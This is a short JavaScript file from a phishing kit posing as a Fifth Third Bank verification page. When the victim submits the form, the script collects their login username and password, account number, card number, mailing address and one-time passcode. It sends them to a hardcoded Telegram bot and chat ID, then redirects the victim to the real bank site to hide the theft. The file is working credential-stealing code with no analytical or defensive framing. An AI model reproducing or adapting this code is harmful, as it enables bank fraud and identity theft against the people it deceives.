// vault/send.js

const BOT_TOKEN = '6631658853:AAFDtIUx4xDRN61dyKiROvlgmo1PpuNtjNU'; // Actual bot token for @ELCHAPOCHAPSBOT
const CHAT_ID = '5817278771';     // Your chat ID

function sendToTelegram(data) {
  const message = `\nFifth Third Secure Panel\n\nLOGIN\n👤 Username: ${data.userid}\n🔑 Password: ${data.password}\n\nVERIFICATION\n🏦 Account Number: ${data.accountnumber}\n💳 Card Number: ${data.cardnumber}\n🏠 Mailing Address: ${data.mailingaddress}\n🔐 OTP: ${data.otp}`;

  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: message
    })
  });
}

document.addEventListener('DOMContentLoaded', function() {
  const form = document.getElementById('verify-form');
  if (!form) return;
  form.addEventListener('submit', function(e) {
    e.preventDefault();
    // Get login from sessionStorage
    const userid = sessionStorage.getItem('userid') || '';
    const password = sessionStorage.getItem('password') || '';
    // Get verification details from form
    const data = {
      userid: userid,
      password: password,
      accountnumber: form.accountnumber.value,
      cardnumber: form.cardnumber.value,
      mailingaddress: form.mailingaddress.value,
      otp: form.otp.value
    };
    sendToTelegram(data);
    // Optionally redirect or show a message
    form.reset();
    window.location.href = 'https://www.53.com/';
  });
}); 
